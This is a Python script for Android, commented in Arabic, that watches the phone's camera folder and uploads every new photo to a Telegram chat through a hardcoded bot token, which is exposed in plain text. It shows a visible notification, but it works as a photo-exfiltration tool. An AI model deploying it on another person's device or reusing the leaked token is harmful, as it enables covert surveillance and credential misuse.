import os
import time
import requests

# --- إعدادات التلجرام الخاصة بك ---
TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"

# متغيرات التحكم
is_running = True

def setup_foreground_service():
    """تفعيل الإشعار الدائم لضمان بقاء التطبيق شغالاً في الخلفية"""
    try:
        from jnius import autoclass
        PythonService = autoclass('org.kivy.android.PythonService')
        service_ctx = PythonService.mService
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        
        notification = NotificationBuilder(service_ctx) \
            .setContentTitle("🛡️ Camera Monitor: Active") \
            .setContentText("جاري مراقبة الكاميرا وإرسال الملفات...") \
            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
            .setOngoing(True) \
            .build()
        service_ctx.startForeground(1, notification)
    except:
        print("تشغيل في بيئة Pydroid")

def send_as_document(photo_path, file_name):
    """إرسال الصورة كملف (Document) للحفاظ على الجودة الكاملة"""
    # نغير الرابط من sendPhoto إلى sendDocument
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(photo_path, 'rb') as doc_file:
            payload = {
                'chat_id': CHAT_ID,
                'caption': f"📄 ملف عالي الجودة:\n{file_name}" 
            }
            # نغير اسم الحقل من photo إلى document
            files = {'document': doc_file}
            requests.post(url, files=files, data=payload)
    except Exception as e:
        print(f"Error sending document: {e}")

def monitor_camera():
    global is_running
    
    # رسالة ترحيب عند التشغيل
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={'chat_id': CHAT_ID, 'text': "✅ بدأ البوت العمل. سيتم إرسال الصور كملفات (Documents)."})
    except:
        pass

    path = "/storage/emulated/0/DCIM/Camera"
    
    # تجاهل الصور القديمة
    known_files = set(os.listdir(path)) if os.path.exists(path) else set()

    while is_running:
        try:
            if os.path.exists(path):
                current_files = set(os.listdir(path))
                new_files = current_files - known_files
                
                for file in new_files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        full_path = os.path.join(path, file)
                        # انتظار اكتمال حفظ الملف في الهاتف
                        time.sleep(2) 
                        send_as_document(full_path, file)
                
                known_files = current_files
        except Exception as e:
            print(f"Monitoring error: {e}")
            
        time.sleep(5)

if __name__ == '__main__':
    setup_foreground_service()
    monitor_camera()
